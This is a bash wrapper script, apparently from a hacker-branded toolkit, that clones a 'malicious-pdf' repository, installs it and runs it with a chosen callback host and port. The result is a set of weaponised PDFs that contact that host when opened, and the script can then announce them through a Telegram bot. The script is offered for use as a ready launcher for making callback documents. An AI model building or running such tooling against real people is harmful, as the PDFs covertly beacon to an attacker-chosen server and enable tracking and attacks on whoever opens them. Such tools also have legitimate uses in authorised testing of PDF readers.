#!/usr/bin/env bash
#
# genpdf.sh — interactive + non-interactive trhacknon wrapper for malicious-pdf
#
# Usage (interactive):
#   ./genpdf.sh
#
# Usage (non-interactive):
#   ./genpdf.sh -y --host 127.0.0.1 --port 4545 --base /home/user/dashpdf --notify --token BOT_TOKEN --chat CHAT_ID
#
# Requirements: git, python3, pip3, curl
#

set -o pipefail
set -u

# --- Colors / style trhacknon ---
CSI="\033["
RESET="${CSI}0m"
BOLD="${CSI}1m"
DIM="${CSI}2m"
FG_GREEN="${CSI}38;2;126;240;194m"
FG_CYAN="${CSI}38;2;0;255;209m"
FG_MAG="${CSI}38;2;255;80;170m"
FG_WHITE="${CSI}38;2;182;255;234m"
BG_BLACK="${CSI}48;2;5;6;7m"

function header() {
  echo -e "${BG_BLACK}${FG_GREEN}${BOLD}"
  cat <<'ASCII'
   _______ __           __  _                 _   _  __
  |__   __/_ |         / _|(_)               | | (_)/ _|
     | |   | |  _ __  | |_  _  _ __  ___  ___| |_ _| |_ ___  _ __
     | |   | | | '_ \ |  _|| || '__|/ _ \/ __| __| |  _/ _ \| '__|
     | |   | | | |_) || |  | || |  |  __/\__ \ |_| | || (_) | |
     |_|   |_| | .__/ |_|  |_||_|   \___||___/\__|_|_| \___/|_|
               | |   trhacknon • dashpdf
               |_|
ASCII
  echo -e "${RESET}"
  echo
}

# spinner helper
function spinner_wait() {
  local pid=$1
  local delay=0.08
  local spinstr='|/-\'
  printf " "
  while ps -p "$pid" > /dev/null 2>&1; do
    local temp=${spinstr#?}
    printf "[%c] " "$spinstr"
    spinstr=$temp${spinstr%"$temp"}
    sleep "$delay"
    printf "\b\b\b\b\b"
  done
  printf "     \b\b\b\b\b"
}

# telegram notify (optional)
function tg_send_text() {
  local token="$1"; local chat="$2"; local text="$3"
  if [[ -z "$token" || -z "$chat" ]]; then return 1; fi
  curl -s -X POST "https://api.telegram.org/bot${token}/sendMessage" \
    -d chat_id="${chat}" \
    -d parse_mode="HTML" \
    -d text="${text}" >/dev/null 2>&1 || return 1
  return 0
}

# prompt helpers with defaults
function prompt_default() {
  local prompt="$1"; local default="$2"; local ret
  read -rp "$(echo -e ${FG_CYAN}${prompt}${RESET}) [${default}]: " ret
  echo "${ret:-$default}"
}

function usage() {
  cat <<EOF
Usage:
  Interactive (default):
    ./genpdf.sh

  Non-interactive:
    ./genpdf.sh -y --host HOST --port PORT [options]

Options:
  -y, --yes            Non-interactive mode (use CLI args / defaults)
  --host HOST          Callback host (default: 127.0.0.1)
  --port PORT          Callback port (default: 4545)
  --base PATH          Base directory for dashpdf (default: ~/dashpdf)
  --no-venv            Do not create/use virtualenv (install global)
  --no-update          Do not pull repo if already present
  --notify             Send Telegram notification once PDFs generated
  --token TOKEN        Telegram bot token (required if --notify)
  --chat CHAT_ID       Telegram chat id (required if --notify)
  -h, --help           Show this help and exit

Examples:
  ./genpdf.sh
  ./genpdf.sh -y --host 10.0.0.1 --port 4545 --base /opt/dashpdf --notify --token BOT_TOKEN --chat 123456
EOF
}

# --- Default values ---
DEFAULT_HOST="127.0.0.1"
DEFAULT_PORT="4545"
DEFAULT_BASE="$HOME/dashpdf"
DEFAULT_UPDATE="yes"
DEFAULT_VENV="yes"
NON_INTERACTIVE="no"
DO_NOTIFY="no"
TG_TOKEN=""
TG_CHAT=""

# Parse args (simple)
ARGS=()
while [[ $# -gt 0 ]]; do
  case "$1" in
    -y|--yes) NON_INTERACTIVE="yes"; shift ;;
    --host) HOST_ARG="$2"; shift 2 ;;
    --port) PORT_ARG="$2"; shift 2 ;;
    --base) BASE_ARG="$2"; shift 2 ;;
    --no-venv) DEFAULT_VENV="no"; shift ;;
    --no-update) DEFAULT_UPDATE="no"; shift ;;
    --notify) DO_NOTIFY="yes"; shift ;;
    --token) TG_TOKEN="$2"; shift 2 ;;
    --chat) TG_CHAT="$2"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    --) shift; break ;;
    -*)
      echo -e "${FG_MAG}Unknown option: $1${RESET}"
      usage
      exit 1
      ;;
    *) ARGS+=("$1"); shift ;;
  esac
done

# if args provided override defaults
HOST="${HOST_ARG:-$DEFAULT_HOST}"
PORT="${PORT_ARG:-$DEFAULT_PORT}"
BASE_DIR="${BASE_ARG:-$DEFAULT_BASE}"
UPDATE_REPO="${DEFAULT_UPDATE}"
USE_VENV="${DEFAULT_VENV}"

MALPDF_DIR="${BASE_DIR%/}/malicious-pdf"

# Interactive mode: ask prompts
if [[ "${NON_INTERACTIVE}" != "yes" ]]; then
  clear
  header
  mkdir -p "$BASE_DIR" || { echo -e "${FG_MAG}Impossible de créer $BASE_DIR${RESET}"; exit 1; }
  cd "$BASE_DIR" || { echo -e "${FG_MAG}Impossible d'accéder à $BASE_DIR${RESET}"; exit 1; }
  echo -e "${FG_WHITE}Dossier de travail :${RESET} ${FG_CYAN}$BASE_DIR${RESET}"

  HOST=$(prompt_default "Host (callback) ou domaine (ex: 127.0.0.1 ou my.domain.tld)" "$HOST")
  PORT=$(prompt_default "Port (ex: 4545)" "$PORT")
  BURP_URL="http://${HOST}:${PORT}"
  echo -e "${FG_WHITE}Callback URL:${RESET} ${FG_CYAN}$BURP_URL${RESET}"

  UPDATE_REPO=$(prompt_default "Mettre à jour le repo malicious-pdf si déjà présent ? (y/n)" "${UPDATE_REPO}")
  USE_VENV=$(prompt_default "Créer et utiliser un virtualenv Python (recommandé) ? (y/n)" "${USE_VENV}")

  DO_NOTIFY=$(prompt_default "Envoyer une notification Telegram une fois les PDFs générés ? (y/n)" "${DO_NOTIFY}")
  if [[ "${DO_NOTIFY,,}" =~ ^y ]]; then
    read -rp "$(echo -e ${FG_CYAN}TELEGRAM_TOKEN (bot token)${RESET}): " TG_TOKEN
    read -rp "$(echo -e ${FG_CYAN}TELEGRAM_CHAT_ID (chat id)${RESET}): " TG_CHAT
  fi
else
  # Non-interactive: prepare variables and ensure base dir exists
  mkdir -p "$BASE_DIR" || { echo -e "${FG_MAG}Impossible de créer $BASE_DIR${RESET}"; exit 1; }
  cd "$BASE_DIR" || { echo -e "${FG_MAG}Impossible d'accéder à $BASE_DIR${RESET}"; exit 1; }
  BURP_URL="http://${HOST}:${PORT}"
  # if notify requested, ensure token/chat exist
  if [[ "${DO_NOTIFY}" == "yes" && ( -z "$TG_TOKEN" || -z "$TG_CHAT" ) ]]; then
    echo -e "${FG_MAG}--notify requires --token and --chat in non-interactive mode${RESET}"
    exit 1
  fi
fi

echo -e "${FG_GREEN}--- Démarrage des opérations ---${RESET}"
echo -e "${FG_WHITE}Base dir:${RESET} ${FG_CYAN}$BASE_DIR${RESET}"
echo -e "${FG_WHITE}Repo dir:${RESET} ${FG_CYAN}$MALPDF_DIR${RESET}"
echo -e "${FG_WHITE}Callback URL:${RESET} ${FG_CYAN}$BURP_URL${RESET}"

# Clone or update
if [[ ! -d "$MALPDF_DIR" ]]; then
  echo -e "${FG_WHITE}Clonage du repo malicious-pdf...${RESET}"
  git clone https://github.com/tucommenceapousser/malicious-pdf.git "$MALPDF_DIR" || { echo -e "${FG_MAG}Echec du clone${RESET}"; exit 1; }
else
  echo -e "${FG_WHITE}Repo malicious-pdf déjà présent.${RESET}"
  if [[ "${UPDATE_REPO,,}" =~ ^y ]]; then
    echo -e "${FG_WHITE}Pull des dernières modifications...${RESET}"
    (cd "$MALPDF_DIR" && git pull) || echo -e "${FG_MAG}Pull échoué (ignorer)${RESET}"
  fi
fi

# Prepare python env & install requirements
echo -e "${FG_WHITE}Préparation de l'environnement Python...${RESET}"
cd "$MALPDF_DIR" || { echo -e "${FG_MAG}Impossible d'entrer dans $MALPDF_DIR${RESET}"; exit 1; }

VENV_DIR="${MALPDF_DIR}/.venv"
if [[ "${USE_VENV,,}" =~ ^y ]]; then
  echo -e "${FG_WHITE}Création/activation du virtualenv...${RESET}"
  python3 -m venv "$VENV_DIR" || { echo -e "${FG_MAG}Création venv échouée${RESET}"; exit 1; }
  # shellcheck disable=SC1090
  source "${VENV_DIR}/bin/activate"
  echo -e "${FG_CYAN}Virtualenv activé : ${VENV_DIR}${RESET}"
else
  echo -e "${FG_WHITE}Installation globale (sans venv)...${RESET}"
fi

if [[ -f requirements.txt ]]; then
  echo -e "${FG_WHITE}Installation des requirements (pip)...${RESET}"
  pip3 install --upgrade pip >/dev/null 2>&1 || true
  pip3 install -r requirements.txt
else
  echo -e "${FG_MAG}Aucun requirements.txt trouvé.${RESET}"
fi

# Generate PDFs
LOGFILE="/tmp/malgen_$$_$(date +%s).log"
echo -e "${FG_WHITE}Lancement de la génération des PDFs (log: ${LOGFILE})...${RESET}"
# run in background to show spinner
python3 malicious-pdf.py "$BURP_URL" >"$LOGFILE" 2>&1 &
PID=$!
spinner_wait "$PID"
wait "$PID" 2>/dev/null || true

# Check output
cd "$MALPDF_DIR" || exit 1
shopt -s nullglob
PDFS=(test*.pdf)
if [[ ${#PDFS[@]} -eq 0 ]]; then
  echo -e "${FG_MAG}Aucun PDF 'test*.pdf' généré. Voir log: ${LOGFILE}${RESET}"
  # show tail for quick debug in interactive mode
  if [[ "${NON_INTERACTIVE}" != "yes" ]]; then
    echo -e "${FG_WHITE}Dernières lignes du log:${RESET}"
    tail -n 40 "$LOGFILE"
  fi
  # still exit non-zero in non-interactive
  if [[ "${NON_INTERACTIVE}" == "yes" ]]; then
    exit 2
  fi
else
  echo -e "${FG_GREEN}Génération terminée : ${#PDFS[@]} fichiers détectés.${RESET}"
  echo -e "${FG_WHITE}Copie des PDFs dans ${BASE_DIR}${RESET}"
  cp -v test*.pdf "$BASE_DIR/" || echo -e "${FG_MAG}Erreur lors de la copie${RESET}"
fi

# Return to base dir
cd "$BASE_DIR" || exit 1

# List results
echo
echo -e "${FG_CYAN}${BOLD}=== Résultat (${BASE_DIR}) ===${RESET}"
ls -1 --color=auto test*.pdf 2>/dev/null || echo -e "${FG_MAG}Aucun fichier test*.pdf dans $BASE_DIR${RESET}"

# Telegram notification (optional)
if [[ "${DO_NOTIFY,,}" =~ ^y ]]; then
  FILELIST=$(ls test*.pdf 2>/dev/null | tr '\n' ' ' || true)
  MSG="📁 <b>PDFs générés</b>%0ACallback: <code>${BURP_URL}</code>%0AFiles: ${FILELIST}"
  echo -e "${FG_WHITE}Envoi d'une notification Telegram...${RESET}"
  if tg_send_text "${TG_TOKEN}" "${TG_CHAT}" "${MSG}"; then
    echo -e "${FG_GREEN}Notif envoyée.${RESET}"
  else
    echo -e "${FG_MAG}Echec notif Telegram (vérifie token/chat_id).${RESET}"
    # non-interactive: error out if notify requested but failed
    if [[ "${NON_INTERACTIVE}" == "yes" ]]; then
      exit 3
    fi
  fi
fi

echo
echo -e "${FG_GREEN}Terminé — les fichiers sont dans : ${FG_CYAN}$BASE_DIR${RESET}"
echo -e "${DIM}Log d'exécution (si besoin) : ${LOGFILE}${RESET}"
echo

# final optional open / cleanup prompt (only in interactive)
if [[ "${NON_INTERACTIVE}" != "yes" ]]; then
  read -rp "$(echo -e ${FG_CYAN}Afficher le dossier (ls) maintenant ? (y/n)${RESET}) " OPEN_NOW
  if [[ "${OPEN_NOW,,}" =~ ^y ]]; then
    echo -e "${FG_WHITE}Contenu de ${BASE_DIR}:${RESET}"
    ls -lah "$BASE_DIR"
  fi
  echo -e "${FG_CYAN}Merci — trhacknon.${RESET}"
fi

exit 0
